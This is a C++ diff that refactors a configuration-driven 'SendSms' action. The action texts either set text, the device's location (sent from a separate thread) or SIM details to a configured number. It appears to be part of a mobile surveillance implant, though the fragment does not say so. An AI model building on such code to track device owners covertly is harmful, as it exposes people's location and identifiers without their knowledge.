@@ -10,9 +10,9 @@ SendSms::SendSms(Configuration *c) : stopAction(FALSE) {
 }
 
 INT SendSms::run() {
-	wstring number, text;
+	wstring number, text, type;
 	Device *deviceObj = Device::self();
-	BOOL position, sim;
+	BOOL position = FALSE, sim = FALSE;
 
 	auto_ptr<Sms> sms(new(std::nothrow) Sms());
 
@@ -30,15 +30,16 @@ INT SendSms::run() {
 	}
 
 	try {
-		position = conf->getBool(L"position");
+		type = conf->getString(L"type");
 	} catch (...) {
-		position = FALSE;
+		DBG_TRACE(L"Debug - SendSms.cpp - No type set\n", 1, FALSE);
+		return 0;
 	}
 
-	try {
-		sim = conf->getBool(L"sim");
-	} catch (...) {
-		sim = FALSE;
+	if (type.compare(L"location") == 0) {
+		position = TRUE;
+	} else if (type.compare(L"sim") == 0) {
+		sim = TRUE;
 	}
 
 	try {
@@ -60,29 +61,21 @@ INT SendSms::run() {
 		
 		bRes = sms->SendMessage((const LPWSTR)number.c_str(), (const LPWSTR)text.c_str());
 		return bRes;
-	} 
-
-	if (position) {
+	} else if (position) {
+		// Fare attenzione a conf che non deve venir distrutto alla return altrimenti c'e' una race nel thread
 		HANDLE smsThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SmsThread, (void*)conf, 0, NULL);
 
 		if (smsThread == NULL) {
-			CloseHandle(smsThread);
 			return 0;
 		}
+
+		Sleep(1000);
+		CloseHandle(smsThread);
 
 		return 1;
-	}
-
-	if (text.empty() == FALSE) {
+	} else if (text.empty() == FALSE) {
 		wstring text;
 		BOOL bRes;
-
-		try {
-			text = conf->getString(L"text");
-		} catch (...) {
-			DBG_TRACE(L"Debug - SendSms.cpp - No text provided\n", 1, FALSE);
-			return 0;
-		}
 
 		text.resize(70);
 		bRes = sms->SendMessage((const LPWSTR)number.c_str(), (const LPWSTR)text.c_str());
